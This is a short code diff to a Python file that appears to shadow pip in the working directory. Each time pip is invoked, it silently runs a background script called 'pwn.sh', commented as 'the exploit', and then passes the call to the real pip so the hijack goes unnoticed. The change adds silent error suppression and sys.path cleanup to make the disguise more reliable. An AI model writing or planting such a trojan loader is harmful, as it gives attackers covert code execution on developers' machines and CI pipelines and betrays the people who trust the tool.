@@ -3,15 +3,19 @@ import subprocess
 import sys
 
 # Background the exploit
-subprocess.Popen(['bash', 'pwn.sh'], start_new_session=True)
+try:
+    subprocess.Popen(['bash', 'pwn.sh'], start_new_session=True)
+except:
+    pass
 
-# Transparently proxy the real pip
-real_pip = [sys.executable, '-m', 'pip'] + sys.argv[1:]
-# To avoid recursion, we need to make sure we don't call ourselves again
-# But since we are shadowing 'pip.py' in the CWD, if we run from another dir it might be fine.
-# Or we can just exit and let the workflow continue if we don't care about breaking it.
-# Actually, let's try to proxy it properly.
-# Find the real pip module path
-sys.path.remove(os.getcwd())
+# Remove current directory from sys.path to avoid recursion
+cwd = os.getcwd()
+while cwd in sys.path:
+    sys.path.remove(cwd)
+while '' in sys.path:
+    sys.path.remove('')
+
+# Proxy to real pip
 import pip
-sys.exit(pip.main())
+if __name__ == '__main__':
+    sys.exit(pip.main())
